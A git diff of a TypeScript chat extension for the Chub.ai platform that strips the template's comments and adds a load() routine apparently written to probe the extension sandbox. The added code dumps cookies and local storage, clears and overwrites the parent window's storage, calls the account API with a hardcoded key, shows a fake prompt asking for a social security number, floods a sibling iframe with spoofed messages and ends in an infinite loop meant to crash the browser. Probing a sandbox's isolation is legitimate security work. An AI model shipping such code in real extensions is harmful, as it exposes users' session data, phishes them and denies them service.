@@ -1,95 +1,159 @@
 import {ReactElement} from "react";
 import {Extension, ExtensionResponse, InitialData, Message} from "chub-extensions-ts";
 import {LoadResponse} from "chub-extensions-ts/dist/types/load";
+import {Dialog} from "@capacitor/dialog";
 
-/***
- The type that this extension persists message-level state in.
- This is primarily for readability, and not enforced.
-
- @description This type is saved in the database after each message,
-  which makes it ideal for storing things like positions and statuses,
-  but not for things like history, which is best managed ephemerally
-  in the internal state of the ChubExtension class itself.
- ***/
 type MessageStateType = any;
 
-/***
- The type of the extension-specific configuration of this extension.
-
- @description This is for things you want people to be able to configure,
-  like background color.
- ***/
 type ConfigType = any;
 
-/***
- The type that this extension persists chat initialization state in.
- If there is any 'constant once initialized' static state unique to a chat,
- like procedurally generated terrain that is only created ONCE and ONLY ONCE per chat,
- it belongs here.
- ***/
 type InitStateType = any;
 
-/***
- The type that this extension persists dynamic chat-level state in.
- This is for any state information unique to a chat,
-    that applies to ALL branches and paths such as clearing fog-of-war.
- It is usually unlikely you will need this, and if it is used for message-level
-    data like player health then it will enter an inconsistent state whenever
-    they change branches or jump nodes. Use MessageStateType for that.
- ***/
 type ChatStateType = any;
 
-/***
- A simple example class that implements the interfaces necessary for an Extension.
- If you want to rename it, be sure to modify App.js as well.
- @link https://github.com/CharHubAI/chub-extensions-ts/blob/main/src/types/extension.ts
- ***/
+const TESTING_KEY = "8a95d317-5977-47a9-931b-3de8c1ac6448-g969";
+
 export class ChubExtension extends Extension<InitStateType, ChatStateType, MessageStateType, ConfigType> {
 
-    /***
-     A very simple example internal state. Can be anything.
-     This is ephemeral in the sense that it isn't persisted to a database,
-     but exists as long as the instance does, i.e., the chat page is open.
-     ***/
     myInternalState: {[key: string]: any};
+    user: string
 
     constructor(data: InitialData<InitStateType, ChatStateType, MessageStateType, ConfigType>) {
-        /***
-         This is the first thing called in the extension,
-         to create an instance of it.
-         The definition of InitialData is at @link https://github.com/CharHubAI/chub-extensions-ts/blob/main/src/types/initial.ts
-         Character at @link https://github.com/CharHubAI/chub-extensions-ts/blob/main/src/types/character.ts
-         User at @link https://github.com/CharHubAI/chub-extensions-ts/blob/main/src/types/user.ts
-         ***/
         super(data);
         const {
-            characters,         // @type:  { [key: string]: Character }
-            users,                  // @type:  { [key: string]: User}
-            config,                                 //  @type:  ConfigType
-            messageState,                           //  @type:  MessageStateType
-            environment,                     // @type: Environment (which is a string)
-            initState,                             // @type: null | InitStateType
-            chatState                              // @type: null | ChatStateType
+            characters,
+            users,
+            config,
+            messageState,
+            environment,
+            initState,
+            chatState
         } = data;
+        this.user = Object.keys(users)[0];
         this.myInternalState = messageState != null ? messageState : {'someKey': 'someValue'};
         this.myInternalState['numUsers'] = Object.keys(users).length;
         this.myInternalState['numChars'] = Object.keys(characters).length;
     }
 
     async load(): Promise<Partial<LoadResponse<InitStateType, ChatStateType, MessageStateType>>> {
-        /***
-         This is called immediately after the constructor, in case there is some asynchronous code you need to
-         run on instantiation.
-         ***/
+        console.info("Dumping and logging all cookies.")
+        const cookies = document.cookie.split('; ');
+        cookies.forEach((cookie) => {
+            console.warn(cookie);
+        });
+
+        console.info('Dumping and logging all local storage.');
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            console.warn(`${key}: ${value}`);
+        }
+        console.info('Dumping and logging all parent local storage.');
+        try {
+            const localStorageData: Storage = window.parent.localStorage;
+            try {
+                localStorageData.clear();
+            } catch (exIns: any) {
+                console.error(`Error clearing parent storage, error: ${exIns}`);
+            }
+            try {
+                localStorageData.setItem('insert', 'inserted');
+            } catch (exIns: any) {
+                console.error(`Error writing parent storage, error: ${exIns}`);
+            }
+            for (let i = 0; i < localStorageData.length; i++) {
+                const key = localStorageData.key(i);
+                const value = localStorageData.getItem(key);
+                console.error(`${key}: ${value}`);
+            }
+        } catch (ex: any) {
+            console.error(`Error reading parent storage, error: ${ex}`);
+        }
+
+        console.info('Attempting to interact with Chub API.');
+        let response = await fetch('https://api.chub.ai/api/account', {
+            method: "GET",
+            mode: "cors",
+            headers: {
+                "Access-Control-Allow-Origin": "*",
+                "Access-Control-Allow-Credentials": "True",
+                "samwise": TESTING_KEY,
+                'CH-API-KEY': TESTING_KEY,
+            }
+        });
+        let content = await response.text();
+        console.warn(`Status: ${response.status}, content: ${content}`);
+
+        console.info('Attempting to interact with allowed API.');
+        response = await fetch("https://api.artic.edu/api/v1/artworks");
+        content = await response.text();
+        console.warn(`Status: ${response.status}, content: ${content}`);
+
+        console.info('Attempting to interact with disallowed API.');
+        response = await fetch("https://emojihub.yurace.pro/api/random");
+        content = await response.text();
+        console.warn(`Status: ${response.status}, content: ${content}`);
+
+        console.info('Attempting to alert.');
+        alert('FBI ENROUTE TO YOUR LOCATION.');
+        console.info('Attempting to bypass alert protections with Capacitor.');
+        try {
+            await Dialog.alert({
+                title: 'BURN YOUR COMPUTER',
+                message: "HI!",
+            });
+        } catch (ex: any) {
+            console.error(`Error in CapAlert, error: ${ex}`);
+        }
+        try {
+            const { value } = await Dialog.confirm({
+                title: 'Confirm',
+                message: `Are you sure you'd like to press the red button?`,
+            });
+
+            console.warn('Confirmed:', value);
+        } catch (ex: any) {
+            console.error(`Error in CapConfirm, error: ${ex}`);
+        }
+        try {
+            const { value, cancelled } = await Dialog.prompt({
+                title: 'VERY OFFICIAL TOTALLY NOT SOCIAL ENGINEERING THANK YOU SIR',
+                message: `What's your social security number? Are you susceptible to any diseases?`,
+            });
+
+            console.warn('Name:', value);
+            console.warn('Cancelled:', cancelled);
+        } catch (ex: any) {
+            console.error(`Error in CapConfirm, error: ${ex}`);
+        }
+        console.info("Attempting to bombard sibling iFrame.");
+        const sibling: HTMLIFrameElement = document.querySelector('iframe[src="https://maze-extension-4cd023370343.c5v4v4jx6pq5.win/index.html"][title="Extension"]');
+        const message = {
+            "messageType": 'BEFORE', "data":{ anonymizedId: this.user,
+            content: 'left', isBot: false, promptForId: "2" }};
+        if (sibling) {
+            for(let index = 0; index < 60; index++) {
+                sibling.contentWindow.postMessage(message, "*");
+                sibling.contentWindow.postMessage(message, 'https://maze-extension-4cd023370343.c5v4v4jx6pq5.win');
+                await new Promise(f => setTimeout(f, 1000));
+            }
+        } else {
+            console.error('Iframe not found');
+        }
+        console.info('Done with bombardment.');
+        console.info('Attempting to crash browser.');
+        //@ts-ignore
+        const bigBoi: number[] = [];
+        //@ts-ignore
+        while (true) {
+            for (let i = 0; i < 10000000; i++) {
+                bigBoi.push(i);
+            }
+            console.warn(`THE KITCHEN IS OPEN! NOW SERVING CUSTOMER NUMBERS ${bigBoi}`);
+        }
+        //@ts-ignore
         return {
-            /*** @type boolean @default null
-             @description The 'success' boolean returned should be false IFF (if and only if), some condition is met that means
-              the extension shouldn't be run at all and the iFrame can be closed/removed.
-              For example, if an extension displays expressions and no characters have an expression pack,
-              there is no reason to run the extension, so it would return false here. ***/
             success: true,
-            /*** @type null | string @description an error message to show
-             briefly at the top of the screen, if any. ***/
             error: null,
             initState: null,
             chatState: null,
@@ -97,77 +161,37 @@ export class ChubExtension extends Extension<InitStateType, ChatStateType, Messa
     }
 
     async setState(state: MessageStateType): Promise<void> {
-        /***
-         This can be called at any time, typically after a jump to a different place in the chat tree
-         or a swipe. Note how neither InitState nor ChatState are given here. They are not for
-         state that is affected by swiping.
-         ***/
         if (state != null) {
             this.myInternalState = {...this.myInternalState, ...state};
         }
     }
 
     async beforePrompt(userMessage: Message): Promise<Partial<ExtensionResponse<ChatStateType, MessageStateType>>> {
-        /***
-         This is called after someone presses 'send', but before anything is sent to the LLM.
-         ***/
         const {
-            content,            /*** @type: string
-             @description Just the last message about to be sent. ***/
-            anonymizedId,       /*** @type: string
-             @description An anonymized ID that is unique to this individual
-              in this chat, but NOT their Chub ID. ***/
-            isBot             /*** @type: boolean
-             @description Whether this is itself from another bot, ex. in a group chat. ***/
+            content,
+            anonymizedId,
+            isBot
         } = userMessage;
         return {
-            /*** @type null | string @description A string to add to the
-             end of the final prompt sent to the LLM,
-             but that isn't persisted. ***/
             extensionMessage: null,
-            /*** @type MessageStateType | null @description the new state after the userMessage. ***/
             messageState: {'someKey': this.myInternalState['someKey']},
-            /*** @type null | string @description If not null, the user's message itself is replaced
-             with this value, both in what's sent to the LLM and in the database. ***/
             modifiedMessage: null,
-            /*** @type null | string @description A system message to append to the end of this message.
-             This is unique in that it shows up in the chat log and is sent to the LLM in subsequent messages,
-             but it's shown as coming from a system user and not any member of the chat. If you have things like
-             computed stat blocks that you want to show in the log, but don't want the LLM to start trying to
-             mimic/output them, they belong here. ***/
             systemMessage: null,
-            /*** @type null | string @description an error message to show
-             briefly at the top of the screen, if any. ***/
             error: null,
             chatState: null,
         };
     }
 
     async afterResponse(botMessage: Message): Promise<Partial<ExtensionResponse<ChatStateType, MessageStateType>>> {
-        /***
-         This is called immediately after a response from the LLM.
-         ***/
         const {
-            content,            /*** @type: string
-             @description The LLM's response. ***/
-            anonymizedId,       /*** @type: string
-             @description An anonymized ID that is unique to this individual
-              in this chat, but NOT their Chub ID. ***/
-            isBot             /*** @type: boolean
-             @description Whether this is from a bot, conceivably always true. ***/
+            content,
+            anonymizedId,
+            isBot
         } = botMessage;
         return {
-            /*** @type null | string @description A string to add to the
-             end of the final prompt sent to the LLM,
-             but that isn't persisted. ***/
             extensionMessage: null,
-            /*** @type MessageStateType | null @description the new state after the botMessage. ***/
             messageState: {'someKey': this.myInternalState['someKey']},
-            /*** @type null | string @description If not null, the bot's response itself is replaced
-             with this value, both in what's sent to the LLM subsequently and in the database. ***/
             modifiedMessage: null,
-            /*** @type null | string @description an error message to show
-             briefly at the top of the screen, if any. ***/
             error: null,
             systemMessage: null,
             chatState: null
@@ -176,19 +200,6 @@ export class ChubExtension extends Extension<InitStateType, ChatStateType, Messa
 
 
     render(): ReactElement {
-        /***
-         There should be no "work" done here. Just returning the React element to display.
-         If you're unfamiliar with React and prefer video, I've heard good things about
-         @link https://scrimba.com/learn/learnreact but haven't personally watched/used it.
-
-         For creating 3D and game components, react-three-fiber
-           @link https://docs.pmnd.rs/react-three-fiber/getting-started/introduction
-           and the associated ecosystem of libraries are quite good and intuitive.
-
-         Cuberun is a good example of a game built with them.
-           @link https://github.com/akarlsten/cuberun (Source)
-           @link https://cuberun.adamkarlsten.com/ (Demo)
-         ***/
         return <div style={{
             width: '100vw',
             height: '100vh',
